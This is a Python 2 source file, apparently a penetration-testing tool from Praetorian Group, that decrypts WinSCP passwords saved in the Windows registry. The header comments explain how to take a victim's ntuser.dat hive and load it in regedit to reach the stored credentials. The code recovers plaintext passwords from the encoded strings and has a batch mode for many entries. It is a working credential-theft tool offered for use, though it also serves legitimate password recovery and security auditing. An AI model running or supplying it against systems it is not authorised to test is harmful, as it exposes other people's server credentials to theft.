#
# Author: Adam Pridgen <adam@praetoriangrp.com>
# (c) 2010 Praetorian Group, LLC http://www.praetoriangrp.com
# scp_decrypter.py: script to decrypt the win scp saved password
# The password string can be found in the registry of the current
# user.
# HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\<session_name>\
# the key name is Password and it is followed by a hexlified string
#
# To get the shared keys, high-jack the user's ntuser.dat and open it with 
# regedit, highlight HKEY_USERS, then goto to File->Import Hive, input the 
# directory and file of the high-jacked ntuser.dat file, and then navigate 
# to the key as it is described above.
#
# GPL v3
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#

from binascii import *
from optparse import OptionParser
import sys

def set_parse_options():
	parser = OptionParser()
	parser.add_option("-e", dest="wscp_encrypted_str", type="string",
                  help="encrypted SCP password string")
	parser.add_option("-u", dest="username", type="string",
                  help="user name for the SCP password")
	parser.add_option("-n", dest="hostname", type="string",
                  help="hostname that accepts the SCP password")
	parser.add_option("-b", dest="batch", action="store_true",
                  help="run script in batch mode")
	parser.add_option("-f", dest="fname", type="string",
                  help="file to read when run in batch mode")

	parser.set_defaults(wscp_encrypted_str = None, 
						hostname=None, 
						username=None,
						fname=None,
						batch=False)
	return parser

decrypt_scpstr = lambda est: "".join([chr(~(0xa3 ^ ord(i)) + 2**8) for i in unhexlify(est)])

if __name__ == "__main__":
	parser = set_parse_options()
	(options, args) = parser.parse_args()
	if options.wscp_encrypted_str is None and options.fname is None:
		print "Error did not specify a the encrypted SCP string or a batch mode/file"
		parser.print_help()
		sys.exit(-1)
	print "\n\n\n"
	if options.batch and not options.fname is None:
		strings = open(options.fname).readlines()
		for i in strings:
			if i.strip() == "": 
				continue
			dstr =  decrypt_scpstr(i.strip().split()[-1])
			host = ""
			if i.strip().split() > 1:
				host = i.strip().split()[0]
			length = 0
			idx = 4
			if dstr[0] == '\xff':
				length = ord(dstr[2])
				idx += ord(dstr[3])
			else:
				length = ord(dstr[0])
				idx += ord(dstr[1])
			print "Encrypted String: %s"%(i.strip())
			print "Decrypted Length: %d, String: %s"%(length, repr(dstr[idx:idx+length]))
			print "\n"
		sys.exit(0)
	string = decrypt_scpstr(options.wscp_encrypted_str)
	if options.hostname is None or\
		options.username is None:
		print "The following string was decrypted: %s"%(repr(string))
		sys.exit(0)
	host_pos = string.find(options.hostname)
	user_pos = string.find(options.username)
	if user_pos > -1 and host_pos > user_pos:
		print "Password appears to be: %s"%(string.split(options.hostname)[1])
	else:
		print "Failed to find the specified host or username.  Decrypted string: %s"%(repr(string))
	sys.exit(0)